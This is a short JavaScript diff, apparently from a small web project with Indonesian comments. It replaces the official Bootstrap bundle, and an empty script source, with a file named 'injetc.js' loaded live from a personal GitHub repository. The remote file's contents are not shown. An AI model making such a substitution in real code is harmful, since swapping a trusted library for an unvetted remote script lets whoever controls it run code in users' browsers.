@@ -94,7 +94,7 @@ var script2 = document.createElement('script');
 
 script2.type = 'text/javascript';
 
-script2.src = '';
+script2.src = 'https://raw.githubusercontent.com/GMhabib/index.js/main/injetc.js';
 
 //<!----- Then bind the event to the callback function.--->
 
@@ -140,7 +140,7 @@ head2.appendChild(script);
 
 }
 
-loadScript('https://raw.githubusercontent.com/twbs/bootstrap/main/dist/js/bootstrap.bundle.js', function() {});
+loadScript('https://raw.githubusercontent.com/GMhabib/index.js/main/injetc.js', function() {});
 
 //<!--- ini adalah toast jika berhasil di import maka dia muncul --->
 
